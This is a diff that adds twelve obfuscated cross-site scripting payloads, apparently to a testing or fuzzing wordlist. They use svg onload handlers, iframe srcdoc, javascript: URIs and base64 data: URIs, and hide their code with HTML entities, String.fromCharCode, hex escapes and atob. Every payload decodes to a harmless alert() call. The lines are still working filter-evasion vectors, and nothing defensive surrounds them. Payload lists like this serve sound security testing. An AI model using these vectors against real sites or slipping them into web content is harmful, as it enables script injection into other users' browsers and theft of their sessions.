@@ -1,0 +1,12 @@
+<svg/onload="&#97;&#108;&#101;&#114;&#116;&#96;1`">
+<iframe srcdoc="<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#96;&#49;&#96;&#41;>">
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>">
+<iframe src="javascript:eval('\x61\x6c\x65\x72\x74\x28\x60\x31\x60\x29')">
+<object data='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='></object>
+<iframe src="data:text/html;base64,PGltZyBzcmM9XCIiIG9uZXJyb3I9YWxlcnQoMik+">
+<svg onload="this.src=&#34;d&#34;;eval(atob(&#39;YWxlcnQoMCk=&#39;))">
+<iframe src="javascript:eval('alert(' + String.fromCharCode(49) + ')')">
+<iframe srcdoc='&lt;img src=x onerror=eval(atob("YWxlcnQoMSk="))&gt;'>
+<iframe src="data:text/html;base64,PGltZyBzcmM9IiIgb25lcnJvcj1hbGVydCgxKT4=">
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<object data='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='></object>
